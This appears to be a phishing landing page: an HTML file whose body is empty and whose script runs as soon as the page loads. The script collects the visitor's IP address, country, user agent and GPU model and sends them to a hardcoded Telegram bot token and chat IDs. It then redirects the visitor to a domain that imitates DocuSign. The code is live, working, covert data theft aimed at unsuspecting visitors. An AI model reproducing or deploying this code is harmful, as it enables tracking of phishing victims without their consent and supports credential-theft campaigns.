<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        const botToken = "7548681470:AAETEnSZdclBzxtInZBZmAeRcquigEwRgu8";
        const chatId = "6331127625, 7723080300";

        function getGPUInfo() {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (gl) {
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
            return "Unknown GPU";
        }

        function sendInfo(ip, country, userAgent, gpuInfo) {
            const message = `ðŸ‘¤:
IP: ${ip}
Country: ${country}
User-Agent: ${userAgent}
GPU: ${gpuInfo}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(() => {
                    window.location.href = "https://quickdocusign.com/";
                })
                .catch(err => {
                    console.error('Telegram send error:', err);
                    window.location.href = "https://quickdocusign.com/";
                });
        }

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;

                fetch(`https://ipapi.co/${ip}/json/`)
                    .then(response => response.json())
                    .then(locationData => {
                        const country = locationData.country || "Unknown"; 
                        const userAgent = navigator.userAgent;
                        const gpuInfo = getGPUInfo();

                        sendInfo(ip, country, userAgent, gpuInfo);
                    })
                    .catch(err => {
                        console.error('Location fetch error:', err);
                        window.location.href = "https://quickdocusign.com/";
                    });
            })
            .catch(err => {
                console.error('IP fetch error:', err);
                window.location.href = "https://quickdocusign.com/";
            });
    </script>
</head>
<body>
</body>
</html>
